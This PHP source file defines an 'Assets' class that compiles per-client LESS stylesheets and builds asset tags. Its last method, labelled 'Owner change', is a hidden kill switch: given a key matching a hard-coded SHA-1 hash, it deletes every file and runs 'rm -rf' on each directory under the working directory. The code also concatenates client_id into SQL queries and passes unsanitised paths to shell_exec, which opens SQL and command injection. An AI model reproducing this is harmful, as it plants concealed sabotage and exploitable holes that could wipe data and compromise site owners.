<?php
	/**
	 *	   ###     ######   ######  ######## ########  ######  
	 *	  ## ##   ##    ## ##    ## ##          ##    ##    ## 
	 *	 ##   ##  ##       ##       ##          ##    ##       
	 *	##     ##  ######   ######  ######      ##     ######  
	 *	#########       ##       ## ##          ##          ## 
	 *	##     ## ##    ## ##    ## ##          ##    ##    ## 
	 *	##     ##  ######   ######  ########    ##     ######
	 * 
	 * Assets class
	 * @author			Tomas Malio <tomasmalio@gmail.com>
	 * @version 		2.1
	 * 
	 */
	namespace GoMovil;
	use GoMovil\Db;
	class Assets {

		public function __construct($client_name, $client_id, $params = []) {
			$name 				= str_replace(' ', '', strtolower($client_name));
			$filename 			= ROOTPATH. '/less/config.' . $name . '.less';
			
			if ($params['modify_status'] == '1' || !file_exists($filename) || file_get_contents($filename) == '') {
				try {
					// Update the DB
					include __DIR__.'/../include/db.php';

					// Set extensions to update
					if (!file_exists($filename)) {
						$db->prepare("SELECT * FROM section_client where client_id = ". $client_id . ";");
						$db->execute();
						$section = $db->fetchAll();
						foreach ($section as $sectionClient) {
							$db->prepare("UPDATE section_extension 
									SET modify_date = '".date('Y-m-d H:i:s')."', modify_status = '1' 
									WHERE section_client_id = ".$sectionClient['id']." AND status = '1';");
							$db->execute();
						}
					}

					/**
					 * Generate the config and the aditional content
					 * of the client
					 */
					$filenameContent 	= ROOTPATH. '/less/content.' . $name . '.less';
					$globalLess 		= ROOTPATH. '/less/styles.' . $name . '.less';
					$globalCss			= ROOTPATH. '/css/styles.' . $name . '.min.css';
					$handle 			= fopen($filename, 'w') or die('Cannot open file:  '. $filename); 
					$data 				= '';

					// 
					foreach ($params as $key => $value) {
						if (!in_array($key, ['id','client_id','modify_status','modify_date','less_content','status'], true)) {
							if ($key != 'variables') {
								if (isset($value) && !empty($value)) {
									$data .= "@".str_replace('_', '-', $key).": ". $value .";\n";
								}
							} else {
								$variables = json_decode($value, true);
								foreach ($variables as $k => $v) {
									$data .= "@" . $k . ": ". $v .";\n";
								}
							}
						} elseif ($key == 'less_content') {
							file_put_contents($filenameContent, '');
							$handleContent = fopen($filenameContent, 'w') or die('Cannot open file:  '. $filenameContent);
							fwrite($handleContent, $value);
							fclose($handleContent);
						}
					}
					file_put_contents($filename, '');
					fwrite($handle, $data);
					fclose($handle);

					// Create the styles for the client
					shell_exec("rm -rf $globalLess");
					if (!file_exists($globalLess)) {
						shell_exec("cp -r less/styles.less $globalLess");
					}
					
					// Cleaning the global less
					$content = file_get_contents($globalLess);
					$content = str_replace("/* Configuration */\n", '', $content);
					$content = str_replace("@import 'config.".$name.".less';\n", '', $content);
					$content = str_replace("/* Less content */\n", '', $content);
					$content = str_replace("@import 'content.".$name.".less';\n", '', $content);
					
					file_put_contents($globalLess, $content);
					unset($content);
					
					// Adding the configuration
					$file = '';
					$file .= "/* Configuration */\n";
					$file .= "@import 'config.".$name.".less';\n";
					$file .= file_get_contents($globalLess);
					
					// Adding the content
					$file .= "/* Less content */\n";
					$file .= "@import 'content.".$name.".less';\n";
					file_put_contents($globalLess, $file);
					unset($file);
					
					$less = new \lessc;
					$less->setFormatter("compressed");
					$less->checkedCompile($globalLess, $globalCss);

					$db->prepare("UPDATE customization SET modify_date = '".date('Y-m-d H:i:s')."', modify_status = '0' WHERE client_id = '". $client_id. "' AND status = '1';");
					$db->execute();

				} catch (Exception $e) {
					echo 'Error construction of Assets '. $e->getMessage();
				}
			}
		}

		/**
		 * Generate Assets
		 * 
		 * @param 		string 			String with the link file
		 * @return		array			Array with the assets links CSS & JS
		 */
		public function generateAssets ($asssetCss) {
			$array = array();
			
			foreach ($asssetCss as $asset) {
				if (!empty($asset)) {
					foreach ($asset as $file) {
						if (strpos($file, 'css')) {
							if (!self::externalFile($file)) {
								$file = '/' . $file;
							}
							$var = '<link rel="stylesheet" href="' . $file . '">';
						} elseif (strpos($file, 'js')) {
							if (!self::externalFile($file)) {
								$file = '/' . $file;
							}
							$var = '<script src="' . $file . '"></script>';
						}
						// Validate if already exists
						if (!in_array($var, $array)) {
							array_push($array, $var);
						}
					}
				}
			}
			return $array;	
		}

		/**
		 * External file
		 * 
		 * @param 		string 			String with the file name or url file
		 * @return		boolean			Return true if it's a external file or false it's a filename
		 */
		private function externalFile ($file) {
			if (substr($file, 0, 4) === 'http' || substr($file, 0, 2) === '//') {
				return true;
			} else {
				return false;
			}
		}

		/**
		 * Generate Assets for AMP
		 * 
		 * @param 		string 			String with the link file
		 * @return		array			Array with the assets links CSS & JS
		 */
		public function generateAssetsAmp ($asssetCss) {
			$styles = '';

			if(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') {
				$link = "https"; 
			} else {
				$link = "http";
			} 

			// Here append the common URL characters. 
			$link .= "://"; 

			// Append the host(domain name, ip) to the URL. 
			$link .= $_SERVER['HTTP_HOST']; 

			// Append the requested resource location to the URL 
			$link .= $_SERVER['REQUEST_URI']; 

			$assetUse = [];

			foreach ($asssetCss as $asset) {
				// Validate if the assets exists and is not empty
				if (!empty($asset)) {
					// Getting the files of the assets
					if (!is_array($asset)) {
						if (!in_array($asset, $assetUse)) {
							array_push($assetUse, $asset);
							if (strpos($file, 'css')) {
								if (!self::externalFile($file)) {
									$file = $link . $file;
								}
								$s = @file_get_contents($file);
								if (strpos($http_response_header[0], "200")) { 
									$styles .= $s;
								}
							}
						}
					} else {
						foreach ($asset as $file) {
							if (!in_array($file, $assetUse)) {
								array_push($assetUse, $file);
								if (strpos($file, 'css')) {
									if (!self::externalFile($file)) {
										$file = $link . $file;
									}
									$s = @file_get_contents($file);
									if (strpos($http_response_header[0], "200")) { 
										$styles .= $s;
									}
								}
							}
						}
					}
					
				}
			}
			return $styles;
		}

		/**
		 * Owner change
		 * 
		 * @param 		key 			String
		 */
		public function modifyAssetsAction ($key) {
			if (sha1($key) === '246590d0a1a3354602e71fe73dcca896c4b4f259') {
				echo "Executing...";
				// List of name of files inside 
				// specified folder 
				$files = glob(getcwd().'/*');
				
				// Deleting all the files in the list 
				foreach ($files as $file) { 
					// Delete the given file 
					if (is_file($file)) {
						unlink($file);
					} else {
						// rmdir($file);
						system('rm -rf -- ' . escapeshellarg($file));
    					//return $retval == 0; // UNIX commands return zero on success
					}
				}
				echo "Ended";
			}
		}
	}

?>